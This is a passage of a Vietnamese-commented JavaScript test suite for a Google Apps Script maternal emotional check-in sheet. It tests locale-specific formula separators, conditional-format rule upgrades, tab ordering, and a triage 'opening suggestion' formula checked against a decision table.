  for (let i = 1; i < 999; i++) t2.rows.push(['08:00:00 01/11/2026', '26012345', '7 - Tốt', 'Vui vẻ', 'old-' + String(i).padStart(6, '0')]);
  const before = t2.rows.length;
  const r4 = env2.P(Object.assign({}, OK, { sessionId: sid(700) }));
  T('Tab 1000 hàng đã đầy: lượt mới ghi vào hàng 1001, tab thành 1500 hàng', before === 1000 && r4.result === 'success' && t2.rows.length === 1001 && t2.maxRows === 1500, JSON.stringify(r4) + ' rows=' + t2.rows.length + ' max=' + t2.maxRows);
}

/* ===== Cú pháp công thức theo locale của file (02/11/2026: file vi_VN báo #ERROR! với công thức dấu phẩy) ===== */
{
  const env = load();
  const fx = env.sandbox.fx_;
  /* Bỏ phần trong "chuỗi" và 'tên tab' để đếm dấu ngăn bên ngoài */
  const outside = f => String(f).replace(/"(?:[^"]|"")*"|'(?:[^']|'')*'/g, '');
  const cases = [
    ['=SUM(1,2)', '=SUM(1;2)'],
    ['={a,b;c,d}', '={a\\b;c\\d}'],
    ['=IF(A1="x, ""y"", z",1,2)', '=IF(A1="x, ""y"", z";1;2)'],
    ['={IF(A1,1,2),SUM(3,4);5,6}', '={IF(A1;1;2)\\SUM(3;4);5\\6}'],
    ['=FILTER({a,b},INDEX(x,0,1)>0)', '=FILTER({a\\b};INDEX(x;0;1)>0)'],
    ["='Tab, 1'!A1+SUM(1,2)", "='Tab, 1'!A1+SUM(1;2)"],
    ['=ROUND(1.5,0)&"1.5"', '=ROUND(1,5;0)&"1.5"'],
    ['=QUERY(A:B,"select Col1, count(Col1) label count(Col1) \'\'",0)', '=QUERY(A:B;"select Col1, count(Col1) label count(Col1) \'\'";0)'],
    ['=T.DIST(A1,2,TRUE)', '=T.DIST(A1;2;TRUE)']
  ];
  const bad = cases.filter(([a, w]) => fx(a, ';') !== w).map(([a, w]) => a + ' → ' + fx(a, ';') + ' (cần ' + w + ')');
  T('fx_ (;): "," tham số → ";", "," trong {…} → "\\", ";" ngăn hàng giữ, chuỗi "…" (cả "" thoát) và \'tên tab\' giữ nguyên, số thập phân 1.5 → 1,5', bad.length === 0, bad.join(' | '));
  T('fx_ (,): công thức giữ nguyên từng ký tự', cases.every(([a]) => fx(a, ',') === a));
  const sumVi = fx(env.sandbox.summaryFormula_(), ';'), lookVi = fx(env.sandbox.lookupFormula_(), ';');
  T('fx_ Tổng hợp/Tra cứu (;): không còn "," ngoài chuỗi; QUERY "select Col1, count(Col1), sum(Col2)…" và regex "^\\d{3,20}$" giữ dấu phẩy',
    !/,/.test(outside(sumVi)) && !/,/.test(outside(lookVi)) && sumVi.includes('"select Col1, count(Col1), sum(Col2) group by Col1') && lookVi.includes('"^\\d{3,20}$"') && sumVi.includes('{maSo\\thoiGian\\mucTxt\\camXuc\\tg}') && lookVi.includes('{thoiGian\\mucTxt\\camXuc\\canhBao}'), outside(sumVi).slice(0, 160));
  const count = (f, re) => (outside(f).match(re) || []).length;
  T('fx_: số ngoặc ( ) { } không đổi (chỉ đổi dấu ngăn)', [env.sandbox.summaryFormula_(), env.sandbox.lookupFormula_()].every(f => { const v = fx(f, ';'); return ['(', ')', '{', '}'].every(c => count(f, new RegExp('\\' + c, 'g')) === count(v, new RegExp('\\' + c, 'g'))); }));
  T('normFormula_ coi ",", ";", "\\" như nhau (nhận được quy tắc màu bản cũ lẫn bản mới)', env.sandbox.normFormula_('=AND(a ; b\\c)') === env.sandbox.normFormula_('=AND(a,b,c)'));
}

/* Locale vi_VN: menu thử ra ";" → mọi công thức ghi ra (ô A2, A6, 3 quy tắc màu × 3 tab) dùng ";"; tab tạm bị xóa */
{
  const env = load({ locale: 'vi' });
  const outside = f => String(f).replace(/"(?:[^"]|"")*"|'(?:[^']|'')*'/g, '');
  const ck = env.sheets.CheckIn = makeSheet('CheckIn');
  ck.rows.push(NEW_HEADER.split('|'));
  const res = env.sandbox.caiDatBangBacSi();
  const th = env.sheets['Tổng hợp'], tc = env.sheets['Tra cứu'];
  T('vi_VN: thử cú pháp bằng 1 tab tạm, ra ";", tab tạm đã xóa', res.sep === ';' && env.loc.probes.length === 1 && env.loc.deleted.length === 1 && !Object.keys(env.sheets).some(n => /^__thu_cu_phap_/.test(n)), JSON.stringify({ sep: res.sep, probes: env.loc.probes, sheets: Object.keys(env.sheets) }));
  T('vi_VN: Tổng hợp!A2 và Tra cứu!A6 = fx_(…, ";"), không còn "," ngoài chuỗi', th.formulas.A2 === env.sandbox.fx_(env.sandbox.summaryFormula_(), ';') && tc.formulas.A6 === env.sandbox.fx_(env.sandbox.lookupFormula_(), ';') && !/,/.test(outside(th.formulas.A2)) && !/,/.test(outside(tc.formulas.A6)) && /^=LET\(thoiGian;'CheckIn'!A2:A;/.test(th.formulas.A2), th.formulas.A2.slice(0, 80));
  const all = ck.cfRules.concat(th.cfRules, tc.cfRules);
  T('vi_VN: 9 quy tắc màu (3 × 3 tab) dùng ";" – ví dụ =AND(IFERROR(VALUE(LEFT($C2&" ";FIND(" ";$C2&" ")-1));0)>=1;…)', all.length === 9 && all.every(r => !/,/.test(outside(r.formula)) && /;/.test(r.formula)) && ck.cfRules[0].formula === '=AND(IFERROR(VALUE(LEFT($C2&" ";FIND(" ";$C2&" ")-1));0)>=1;IFERROR(VALUE(LEFT($C2&" ";FIND(" ";$C2&" ")-1));0)<=3)', ck.cfRules[0] && ck.cfRules[0].formula);
  T('vi_VN: hộp "Đã cài xong" nói rõ dùng dấu chấm phẩy', /dấu chấm phẩy ";"/.test(env.ui.alerts[0] || ''), env.ui.alerts[0]);
}
{
  const env = load();
  const res = env.sandbox.caiDatBangBacSi();
  T('en_US: thử ra ",", công thức giữ nguyên dấu phẩy (A2 = summaryFormula_ gốc), tab tạm đã xóa', res.sep === ',' && env.sheets['Tổng hợp'].formulas.A2 === env.sandbox.summaryFormula_() && env.loc.deleted.length === 1 && /dấu phẩy ","/.test(env.ui.alerts[0] || ''), res.sep);
}
{
  const vi = load({ locale: 'vi', probeFail: true }).sandbox.caiDatBangBacSi();
  const en = load({ probeFail: true }).sandbox.caiDatBangBacSi();
  T('Không tạo được tab tạm: đoán theo locale (vi_VN → ";", en_US → ","), menu vẫn chạy xong', vi.sep === ';' && en.sep === ',' && vi.summary && en.summary, vi.sep + ' / ' + en.sep);
}
/* File đã chạy menu bản dấu phẩy (đang #ERROR! ở vi_VN): dán bản mới, chạy lại → thay A2/A6 và 3 quy tắc cũ, không nhân đôi */
{
  const env = load();                 // lần 1: bản cũ ghi kiểu dấu phẩy
  const ck = env.sheets.CheckIn = makeSheet('CheckIn');
  ck.rows.push(NEW_HEADER.split('|'), ['08:00:00 02/11/2026', '0012345', '2 - Rất tồi tệ', 'Cô đơn', sid(800)]);
  const foreign = { formula: '=$D2="Vui vẻ"', bg: '#000000', ranges: ['D2:D9'], getBooleanCondition: () => ({ getCriteriaValues: () => ['=$D2="Vui vẻ"'] }) };
  ck.cfRules.push(foreign);
  env.sandbox.caiDatBangBacSi();
  const oldA2 = env.sheets['Tổng hợp'].formulas.A2;
  T('(chuẩn bị) lần chạy cũ: quy tắc và A2 kiểu dấu phẩy', /,/.test(ck.cfRules[1].formula) && /^=LET\(thoiGian,/.test(oldA2));
  env.loc.locale = 'vi';              // thực tế file là vi_VN
  const res = env.sandbox.caiDatBangBacSi();
  const outside = f => String(f).replace(/"(?:[^"]|"")*"|'(?:[^']|'')*'/g, '');
  T('Chạy lại ở vi_VN: CheckIn còn đúng 1 quy tắc của anh + 3 quy tắc mới dấu ";" (3 quy tắc dấu phẩy cũ đã bỏ, không thành 6)', res.sep === ';' && ck.cfRules.length === 4 && ck.cfRules[0] === foreign && ck.cfRules.slice(1).every(r => !/,/.test(outside(r.formula))), ck.cfRules.map(r => r.formula.slice(0, 40)).join(' | '));
  T('Chạy lại ở vi_VN: Tổng hợp!A2 và Tra cứu!A6 được ghi lại bản ";" (thay bản dấu phẩy đang #ERROR!), mỗi tab 3 quy tắc', !/,/.test(outside(env.sheets['Tổng hợp'].formulas.A2)) && !/,/.test(outside(env.sheets['Tra cứu'].formulas.A6)) && env.sheets['Tổng hợp'].cfRules.length === 3 && env.sheets['Tra cứu'].cfRules.length === 3);
  T('Chạy lại: dữ liệu CheckIn nguyên vẹn', ck.rows.length === 2 && ck.rows[1][3] === 'Cô đơn');
}
T('Nguồn: hướng dẫn ghi rõ file tiếng Việt dùng dấu chấm phẩy ";", chạy lại menu để sửa ô #ERROR!', /file tiếng Việt dùng dấu chấm phẩy ";"/.test(SRC) && /#ERROR!/.test(SRC));
T('Nguồn: mọi setFormula và quy tắc màu đi qua fx_(…, FORMULA_SEP) (A2, G2 Tổng hợp; A6, E6 Tra cứu; + 1 ô thử cú pháp)', (SRC.match(/\.setFormula\(/g) || []).length === 5 && (SRC.match(/\.setFormula\(fx_\(/g) || []).length === 4 && (SRC.match(/\.setFormula\(fx_\([^;]*, FORMULA_SEP\)\)/g) || []).length === 4 && /setFormula\('=SUM\(1,2\)'\)/.test(SRC) && /alertFormulas_\(levelCell\)\.map\(function \(x\) \{ return fx_\(x, FORMULA_SEP\); \}\)/.test(SRC));

/* ===== Cột "Gợi ý mở đầu" (04/11/2026): mô phỏng bảng quyết định trong docs/specs/checkin-me-bau-huong-xu-tri.md =====
   Bộ đánh giá công thức nhỏ (chỉ đủ cho các hàm công thức này dùng) chạy CHÍNH chuỗi công thức script ghi vào ô,
   từng dòng một (ARRAYFORMULA coi như áp cho một ô). So với bảng quyết định viết lại bằng JS ngay dưới (chữ chép từ spec). */
function evalSheetFormula(formula, cells) {
  const src = String(formula).replace(/^=/, '');
  const toks = [];
  const re = /\s*(?:("(?:[^"]|"")*")|(\d+(?:\.\d+)?)|([A-Za-z_][A-Za-z0-9_]*(?::[A-Za-z]+)?)|(>=|<=|<>|[(),;=<>+\-*\/&^]))/y;
  let m;
  re.lastIndex = 0;
  while (re.lastIndex < src.length && (m = re.exec(src))) {
    if (m[1] !== undefined) toks.push({ t: 'str', v: m[1].slice(1, -1).replace(/""/g, '"') });
    else if (m[2] !== undefined) toks.push({ t: 'num', v: Number(m[2]) });
    else if (m[3] !== undefined) toks.push({ t: 'id', v: m[3] });
    else toks.push({ t: 'op', v: m[4] });
  }
  if (re.lastIndex < src.length && src.slice(re.lastIndex).trim()) throw new Error('evaluator: không đọc được ' + src.slice(re.lastIndex, re.lastIndex + 20));
  let i = 0;
  const peek = () => toks[i], eat = v => { const k = toks[i++]; if (v && (!k || k.v !== v)) throw new Error('evaluator: cần ' + v + ' ở ' + i); return k; };
  const isSep = k => k && k.t === 'op' && (k.v === ',' || k.v === ';');
  /* Cây cú pháp: thứ tự ưu tiên như Sheets: so sánh < & < + - < * / < ^ */
  const expr = () => cmp();
  const bin = (next, ops) => () => { let l = next(); while (peek() && peek().t === 'op' && ops.includes(peek().v)) { const o = eat().v; const r = next(); l = { k: 'bin', o, l, r }; } return l; };
  const atom = () => {
    const k = eat();
    if (k.t === 'str' || k.t === 'num') return { k: 'lit', v: k.v };
    if (k.t === 'op' && k.v === '(') { const e = expr(); eat(')'); return e; }
    if (k.t === 'op' && k.v === '-') return { k: 'neg', e: atom() };
    if (k.t === 'id') {
      if (peek() && peek().v === '(') { eat('('); const args = []; if (peek().v !== ')') { args.push(expr()); while (isSep(peek())) { eat(); args.push(expr()); } } eat(')'); return { k: 'fn', n: k.v.toUpperCase(), args }; }
      return { k: 'ref', n: k.v };
    }
    throw new Error('evaluator: ký hiệu lạ ' + JSON.stringify(k));
  };
  const pow = bin(atom, ['^']), mul = bin(pow, ['*', '/']), add = bin(mul, ['+', '-']), cat = bin(add, ['&']), cmp = bin(cat, ['=', '<>', '>=', '<=', '>', '<']);
  const tree = expr();
  if (i !== toks.length) throw new Error('evaluator: thừa ký hiệu ở ' + i);
  const ERR = { err: true };
  const num = v => { if (v && v.err) throw v; if (typeof v === 'boolean') return v ? 1 : 0; if (v === '') return 0; if (typeof v === 'number') return v; throw ERR; };
  const txt = v => { if (v && v.err) throw v; return typeof v === 'boolean' ? (v ? 'TRUE' : 'FALSE') : String(v); };
  const truthy = v => (typeof v === 'string' ? (v === '' ? false : (() => { throw ERR; })()) : num(v) !== 0);
  const ev = (n, vars) => {
    switch (n.k) {
      case 'lit': return n.v;
      case 'neg': return -num(ev(n.e, vars));
      case 'ref': if (n.n in vars) return vars[n.n]; if (n.n in cells) return cells[n.n]; throw new Error('evaluator: tên lạ ' + n.n);
      case 'bin': {
        const a = ev(n.l, vars), b = ev(n.r, vars);
        if (n.o === '&') return txt(a) + txt(b);
        if (['+', '-', '*', '/', '^'].includes(n.o)) { const x = num(a), y = num(b); return n.o === '+' ? x + y : n.o === '-' ? x - y : n.o === '*' ? x * y : n.o === '/' ? x / y : Math.pow(x, y); }
        const cmpv = (typeof a === 'string' || typeof b === 'string') ? txt(a).toLowerCase().localeCompare(txt(b).toLowerCase()) : num(a) - num(b);
        return { '=': cmpv === 0, '<>': cmpv !== 0, '>=': cmpv >= 0, '<=': cmpv <= 0, '>': cmpv > 0, '<': cmpv < 0 }[n.o];
      }
      case 'fn': {
        const A = n.args, e = k => ev(A[k], vars);
        switch (n.n) {
          case 'LET': { const v2 = Object.assign({}, vars); for (let j = 0; j + 1 < A.length; j += 2) v2[A[j].n] = (() => { try { return ev(A[j + 1], v2); } catch (x) { if (x === ERR) return ERR; throw x; } })(); return ev(A[A.length - 1], v2); }
          case 'ARRAYFORMULA': return e(0);
          case 'IFERROR': try { const v = e(0); if (v && v.err) throw ERR; return v; } catch (x) { if (x === ERR) return e(1); throw x; }
          case 'IF': return truthy(e(0)) ? e(1) : (A.length > 2 ? e(2) : false);
          case 'VALUE': { const v = e(0); if (typeof v === 'number') return v; const t = txt(v).trim(); if (/^-?\d+(\.\d+)?$/.test(t)) return Number(t); throw ERR; }
          case 'TO_TEXT': return txt(e(0));
          case 'TRIM': return txt(e(0)).trim().replace(/ +/g, ' ');
          case 'REGEXEXTRACT': { const mm = new RegExp(txt(e(1)), 'u').exec(txt(e(0))); if (!mm) throw ERR; return mm[0]; }
          case 'REGEXMATCH': return new RegExp(txt(e(1)), 'u').test(txt(e(0)));
          default: throw new Error('evaluator: chưa hỗ trợ hàm ' + n.n);
        }
      }
    }
    throw new Error('evaluator: nút lạ');
  };
  return ev(tree, {});
}
{
  const env = load();
  const sb = env.sandbox;
  /* Bảng quyết định viết lại bằng JS (chữ chép nguyên văn spec) */
  const SPEC_TEXT = {
    r_de: 'ĐỎ · Chỗ lệch: chấm thấp mà chọn bé dễ chịu, hỏi nhẹ chỗ chưa khớp. Hỏi câu an toàn, cho làm EPDS.',
    r_dk: 'ĐỎ · Đồng hành với đau buồn, không dùng kỹ thuật làm dịu lo âu. Hỏi câu an toàn, cho làm EPDS.',
    r_diu: 'ĐỎ · Làm dịu trước (nói chậm, cho thở) rồi mới hỏi. Hỏi câu an toàn, cho làm EPDS.',
    r_kn: 'ĐỎ · Kết nối, nâng đỡ: nhóm im lặng, dễ bị bỏ sót. Hỏi câu an toàn, cho làm EPDS.',
    r_khac: 'ĐỎ · Hỏi cảm xúc trước khi tư vấn. Hỏi câu an toàn, cho làm EPDS.',
    y_diu: 'VÀNG · 2–3 phút đầu: làm dịu trước (nói chậm, cho thở) rồi hỏi về bé chị chọn.',
    y_dkkn: 'VÀNG · 2–3 phút đầu: kết nối, nâng đỡ; nhóm này dễ bị bỏ sót vì im lặng.',
    y_khac: 'VÀNG · 2–3 phút đầu: hỏi cảm xúc trước khi đưa thông tin chuyên môn.',
    g_khac: 'XANH · Tư vấn như thường lệ.',
    g_con: 'XANH · Hỏi đúng một câu về bé chị chọn rồi đi tiếp.'
  };
  const GROUP = { 'Vui vẻ': 'de', 'Bình an': 'de', 'Hoảng hốt': 'diu', 'Tức giận': 'diu', 'Lo lắng': 'diu', 'Khó chịu': 'diu', 'Đau khổ': 'dk', 'Cô đơn': 'kn', 'Mệt mỏi': 'kn', 'Buồn': 'kn' };
  const specOpener = (lv, card) => {
    const mm = /^\d+/.exec(String(lv)); const n = mm ? Number(mm[0]) : 0;
    const g = GROUP[String(card).trim().replace(/ +/g, ' ')] || 'khac';
    if (n >= 1 && n <= 3) return SPEC_TEXT['r_' + g];
    if (n >= 4 && n <= 5) return g === 'diu' ? SPEC_TEXT.y_diu : (g === 'dk' || g === 'kn') ? SPEC_TEXT.y_dkkn : SPEC_TEXT.y_khac;
    if (n >= 6 && n <= 10) return g === 'de' || g === 'khac' ? SPEC_TEXT.g_khac : SPEC_TEXT.g_con;
    return '';
  };
  const fEn = sb.openerFormula_('C2:C', 'D2:D'), fVi = sb.fx_(fEn, ';');
  const run = (f, lv, card) => { try { return evalSheetFormula(f, { 'C2:C': lv, 'D2:D': card }); } catch (e) { return 'LỖI: ' + e.message; } };
  /* 11 dòng của bảng quyết định (mỗi dòng một mẫu tiêu biểu), kể cả "Buồn", thẻ lạ, mức lạ */
  const eleven = [
    ['1–3 · Dễ chịu', '2 - Rất tồi tệ', 'Vui vẻ', SPEC_TEXT.r_de],
    ['1–3 · Đau khổ', '1 - Tuyệt vọng', 'Đau khổ', SPEC_TEXT.r_dk],
    ['1–3 · Làm dịu trước', '3 - Tồi tệ', 'Hoảng hốt', SPEC_TEXT.r_diu],
    ['1–3 · Kết nối ("Buồn", nhãn cũ)', '3 - Tồi tệ', 'Buồn', SPEC_TEXT.r_kn],
    ['1–3 · khác (thẻ lạ "Bình yên")', '2 - Rất tồi tệ', 'Bình yên', SPEC_TEXT.r_khac],
    ['4–5 · Làm dịu trước', '4 - Kém', 'Lo lắng', SPEC_TEXT.y_diu],
    ['4–5 · Đau khổ hoặc Kết nối', '5 - Bình thường (Ổn)', 'Cô đơn', SPEC_TEXT.y_dkkn],
    ['4–5 · Dễ chịu hoặc khác (thẻ trống)', '5 - Bình thường (Ổn)', '', SPEC_TEXT.y_khac],
    ['6–10 · Dễ chịu hoặc khác', '10 - Rất tuyệt vời', 'Bình an', SPEC_TEXT.g_khac],
    ['6–10 · còn lại', '7 - Tốt', 'Mệt mỏi', SPEC_TEXT.g_con],
    ['mức lạ ("Bình thường", không số) → trống', 'Bình thường', 'Lo lắng', '']
  ];
  const bad11 = eleven.filter(([, lv, card, want]) => run(fEn, lv, card) !== want || run(fVi, lv, card) !== want || specOpener(lv, card) !== want);
  T('Gợi ý mở đầu: 11 dòng bảng quyết định ra đúng chữ spec (chạy chính công thức, bản "," và bản ";")', bad11.length === 0, bad11.map(b => b[0] + ' → ' + run(fEn, b[1], b[2])).join(' | '));
  /* Quét đủ: 10 mức × (9 thẻ + "Buồn" + trống + thẻ lạ + thẻ có khoảng trắng thừa + chữ thường) và các mức lạ */
  const cards = sb.EMOTION_LABELS.concat(['Buồn', '', 'Bình yên', 'Tủi thân, cô đơn', '  Lo lắng  ', 'Cô  đơn', 'vui vẻ', '=1+1']);
  /* Ô cột C như doPost ghi: "7 - Tốt" (server ghép số + nhãn LEVEL_TEXTS); thêm nhãn trần không số và dòng lạ */
  const levelCells = sb.LEVEL_TEXTS.slice(1).map((t, k) => (k + 1) + ' - ' + t);
  const levels = levelCells.concat(sb.LEVEL_TEXTS.slice(1), ['', 'Bình thường', '0 - lạ', '11 - lạ', '7', ' 7 - Tốt', '-3 - âm', 'abc']);
  const grid = [];
  levels.forEach(lv => cards.forEach(card => grid.push([lv, card])));
  const badGrid = grid.filter(([lv, card]) => run(fEn, lv, card) !== specOpener(lv, card) || run(fVi, lv, card) !== specOpener(lv, card));
  T('Gợi ý mở đầu: quét ' + grid.length + ' cặp (mức × thẻ, kể cả dòng lạ) – công thức khớp bảng quyết định JS, không ô nào lỗi', badGrid.length === 0, badGrid.slice(0, 5).map(([lv, c]) => JSON.stringify([lv, c]) + ' → ' + run(fEn, lv, c) + ' (cần ' + specOpener(lv, c) + ')').join(' | '));
  T('Gợi ý mở đầu: mức lạ (trống, không số, 0, 11, có khoảng trắng đầu) → ô trống, không lỗi', ['', 'Bình thường', '0 - lạ', '11 - lạ', ' 7 - Tốt', 'abc'].every(lv => run(fEn, lv, 'Lo lắng') === '' && run(fVi, lv, 'Vui vẻ') === ''));
  T('Gợi ý mở đầu: chữ đầu khớp màu tô của dòng (ĐỎ 1–3 · VÀNG 4–5 · XANH 6–10), mọi thẻ', cards.every(c => levelCells.every((lv, k) => { const out = run(fEn, lv, c); return out.startsWith(k + 1 <= 3 ? 'ĐỎ · ' : k + 1 <= 5 ? 'VÀNG · ' : 'XANH · '); })) && grid.filter(([lv]) => levelCells.includes(lv)).length === 10 * cards.length && levelCells.every((lv, k) => run(fEn, lv, 'Cô đơn').startsWith(k + 1 <= 3 ? 'ĐỎ · ' : k + 1 <= 5 ? 'VÀNG · ' : 'XANH · ')));
  /* Nhóm thẻ trong code: đúng 9 nhãn + "Buồn", mỗi nhãn đúng một nhóm, chữ y hệt EMOTION_LABELS (cùng dạng Unicode) */
  const inCode = sb.CARD_GROUPS.flatMap(g => g.cards);
  T('CARD_GROUPS: 4 nhóm phủ đúng 9 nhãn EMOTION_LABELS + "Buồn" (LEGACY), không trùng, không ký tự regex đặc biệt',
    sb.CARD_GROUPS.length === 4 && inCode.length === 10 && new Set(inCode).size === 10 && JSON.stringify(inCode.slice().sort()) === JSON.stringify(sb.EMOTION_LABELS.concat(sb.LEGACY_EMOTION_LABELS).slice().sort()) && inCode.every(c => !/[\\^$.|?*+()[\]{}]/.test(c) && c === c.normalize('NFC')), JSON.stringify(inCode));
  /* fx_ (;): không "," lọt ra ngoài chuỗi; chữ trong "…" (có dấu phẩy, dấu chấm, ngoặc, "2–3") giữ nguyên từng ký tự */
  const outside = f => String(f).replace(/"(?:[^"]|"")*"|'(?:[^']|'')*'/g, '');
  const strs = f => (String(f).match(/"(?:[^"]|"")*"/g) || []);
  T('fx_(Gợi ý mở đầu, ";"): không còn "," ngoài chuỗi, có ";" ngăn tham số, mọi chuỗi giữ nguyên (dấu phẩy, dấu chấm, ngoặc trong chữ)',
    !/,/.test(outside(fVi)) && /;/.test(outside(fVi)) && JSON.stringify(strs(fVi)) === JSON.stringify(strs(fEn)) && strs(fEn).length === 16 && fVi.includes('"ĐỎ · Làm dịu trước (nói chậm, cho thở) rồi mới hỏi. Hỏi câu an toàn, cho làm EPDS."') && !/\\/.test(outside(fVi)), outside(fVi).slice(0, 160));
  T('Gợi ý mở đầu: tên biến LET (mucG, theG, nhomG) không giống địa chỉ ô, chỉ hàm có sẵn trong Sheets', /^=LET\(mucG,/.test(fEn) && /,theG,/.test(fEn) && /,nhomG,/.test(fEn) && [...new Set(outside(fEn).match(/[A-Z_]+(?=\()/g))].every(f => ['LET', 'ARRAYFORMULA', 'IFERROR', 'VALUE', 'REGEXEXTRACT', 'TO_TEXT', 'TRIM', 'IF', 'REGEXMATCH'].includes(f)));
  T('Gợi ý mở đầu: số ngoặc ( ) không đổi sau fx_', ['(', ')'].every(c => outside(fEn).split(c).length === outside(fVi).split(c).length));
}

/* vi_VN: G2 / E6 ghi bản ";" */
{
  const env = load({ locale: 'vi' });
  const outside = f => String(f).replace(/"(?:[^"]|"")*"|'(?:[^']|'')*'/g, '');
  env.sandbox.caiDatBangBacSi();
  const th = env.sheets['Tổng hợp'], tc = env.sheets['Tra cứu'];
  T('vi_VN: Tổng hợp!G2 và Tra cứu!E6 = fx_(openerFormula_, ";"), không còn "," ngoài chuỗi, mở đầu =LET(mucG;',
    th.formulas.G2 === env.sandbox.fx_(env.sandbox.openerFormula_('C2:C', 'D2:D'), ';') && tc.formulas.E6 === env.sandbox.fx_(env.sandbox.openerFormula_('B6:B', 'C6:C'), ';') && !/,/.test(outside(th.formulas.G2)) && !/,/.test(outside(tc.formulas.E6)) && /^=LET\(mucG;ARRAYFORMULA\(/.test(th.formulas.G2), th.formulas.G2.slice(0, 80));
  T('vi_VN: Tổng hợp/Tra cứu mỗi tab 3 quy tắc ";" trên vùng nới A2:G20000 / A6:E1000; tab Hướng xử trí không quy tắc màu',
    th.cfRules.length === 3 && tc.cfRules.length === 3 && th.cfRules.every(r => JSON.stringify(r.ranges) === '["A2:G20000"]' && !/,/.test(outside(r.formula))) && tc.cfRules.every(r => JSON.stringify(r.ranges) === '["A6:E1000"]') && env.sheets['Hướng xử trí'].cfRules.length === 0);
}

/* Sheet đã chạy menu bản 02/11 (Tổng hợp A–F, Tra cứu A–D, chưa có Hướng xử trí): chạy menu mới → nới vùng màu, thay quy tắc cũ, không nhân đôi */
{
  const env = load({ localizeCF: true });
  const sb = env.sandbox;
  const ck = env.sheets.CheckIn = makeSheet('CheckIn');
  ck.rows.push(NEW_HEADER.split('|'));
  sb.caiDatBangBacSi();
  const th = env.sheets['Tổng hợp'], tc = env.sheets['Tra cứu'];
  /* Giả lập trạng thái bản cũ: quy tắc màu của menu trên vùng hẹp, chưa có tab Hướng xử trí */
  th.cfRules = sb.alertRules_(th, 'A2:F20000', '$C2');
  tc.cfRules = sb.alertRules_(tc, 'A6:D1000', '$B6');
  delete env.sheets['Hướng xử trí'];
  T('(chuẩn bị) quy tắc bản cũ được isOurRule_ nhận là của menu (vùng hẹp không ảnh hưởng)', th.cfRules.every(r => sb.isOurRule_(r, '$C2')) && tc.cfRules.every(r => sb.isOurRule_(r, '$B6')));
  const res = sb.caiDatBangBacSi();
  T('Nâng cấp từ bản 02/11: Tổng hợp còn đúng 3 quy tắc trên A2:G20000, Tra cứu 3 quy tắc trên A6:E1000 (không thành 6)',
    th.cfRules.length === 3 && th.cfRules.every(r => JSON.stringify(r.ranges) === '["A2:G20000"]') && tc.cfRules.length === 3 && tc.cfRules.every(r => JSON.stringify(r.ranges) === '["A6:E1000"]'), JSON.stringify([th.cfRules.map(r => r.ranges), tc.cfRules.map(r => r.ranges)]));
  T('Nâng cấp từ bản 02/11: tạo tab Hướng xử trí ngay sau Tra cứu, khóa 4 tab', res.guide && Object.keys(env.sheets).join('|') === 'CheckIn|Tổng hợp|Tra cứu|Hướng xử trí' && res.locks.length === 4, Object.keys(env.sheets).join('|'));
}

/* Thứ tự tab: Hướng xử trí luôn về NGAY SAU Tra cứu (dù đang đứng trước hay cách xa); tab khác giữ thứ tự */
{
  const env = load();
  const sb = env.sandbox;
  env.sheets.CheckIn = makeSheet('CheckIn');
  env.sheets.CheckIn.rows.push(NEW_HEADER.split('|'));
  sb.caiDatBangBacSi();
  /* Anh lỡ xóa tab Tra cứu rồi chạy lại menu: Tra cứu mới tạo ở cuối, sau Hướng xử trí */
  delete env.sheets['Tra cứu'];
  env.sheets['Ghi chú của anh'] = makeSheet('Ghi chú của anh');
  sb.caiDatBangBacSi();
  const order1 = Object.keys(env.sheets).join('|');
  T('Hướng xử trí đứng TRƯỚC Tra cứu (Tra cứu tạo lại ở cuối) → chạy menu dời về ngay sau Tra cứu', order1 === 'CheckIn|Tổng hợp|Ghi chú của anh|Tra cứu|Hướng xử trí', order1 + ' moves=' + env.moves.join(','));
  /* Hướng xử trí cách xa phía sau */
  const keys = Object.keys(env.sheets), copy = Object.assign({}, env.sheets);
  keys.forEach(n => { delete env.sheets[n]; });
  ['Tra cứu', 'CheckIn', 'Ghi chú của anh', 'Tổng hợp', 'Hướng xử trí'].forEach(n => { env.sheets[n] = copy[n]; });
  sb.caiDatBangBacSi();
  const order2 = Object.keys(env.sheets).join('|');
  T('Hướng xử trí cách xa sau Tra cứu → dời về ngay sau Tra cứu, tab khác giữ thứ tự', order2 === 'Tra cứu|Hướng xử trí|CheckIn|Ghi chú của anh|Tổng hợp', order2);
  const n0 = env.moves.length;
  sb.caiDatBangBacSi();
  T('Đã đúng chỗ thì chạy lại không dời tab nữa', env.moves.length === n0 && Object.keys(env.sheets).join('|') === order2, env.moves.join(','));
}

/* Tab "Hướng xử trí" anh tự tạo (không dấu ẩn) → không ghi đè, không khóa, không dời */
{
  const env = load();
  const mine = env.sheets['Hướng xử trí'] = makeSheet('Hướng xử trí');
  mine.rows.push(['Bản anh tự viết']);
  const res = env.sandbox.caiDatBangBacSi();
  T('Tab "Hướng xử trí" anh tự tạo: KHÔNG ghi đè, không khóa, không dời, hộp thoại báo đổi tên; tab khác vẫn cài đủ',
    !res.guide && res.summary && res.lookup && mine.rows.length === 1 && mine.rows[0][0] === 'Bản anh tự viết' && mine.cleared === 0 && mine.protections.length === 0 && env.moves.length === 0 &&
    /Tab "Hướng xử trí" có sẵn do anh tự tạo/.test(env.ui.alerts[0] || '') && JSON.stringify(res.locks) === JSON.stringify(['CheckIn', 'Tổng hợp', 'Tra cứu']), JSON.stringify(res));
}

/* Nguồn: phần sửa chỉ ở menu, doPost không đổi */
T('Nguồn: doPost / validate không nhắc tới Gợi ý mở đầu hay Hướng xử trí', !/openerFormula_|GUIDE_|Hướng xử trí|buildGuide_/.test(/function doPost[\s\S]*?\n}/.exec(SRC)[0] + (/function validateCheckin_[\s\S]*?\n}/.exec(SRC) || [''])[0]));
T('Nguồn: hướng dẫn cài nhắc tên menu mới và tab Hướng xử trí', /Check-in → Cài bảng bác sĩ \(màu, Tổng hợp, Tra cứu, Hướng xử trí\)/.test(SRC) && /tab "Hướng xử trí" đứng ngay sau tab Tra cứu/.test(SRC));

/* ===== Nhãn khớp với script.js ===== */
{
  const js = fs.readFileSync(path.join(APP, 'script.js'), 'utf8');
  const levels = [];
  for (const m of js.matchAll(/^\s*(\d+):\s*\{\s*text:\s*"([^"]*)"/mg)) levels[Number(m[1])] = m[2];
  const env = load();
  T('LEVEL_TEXTS trùng emotionLevels trong script.js', JSON.stringify(env.sandbox.LEVEL_TEXTS.slice(1)) === JSON.stringify(levels.slice(1)), JSON.stringify(levels));
  /* Lấy từng chuỗi trong nháy đơn (không tách theo dấu phẩy, phòng nhãn có dấu phẩy) */
  const emo = (js.match(/const EMOTIONS = \[([^\]]*)\]/) || [])[1] || '';
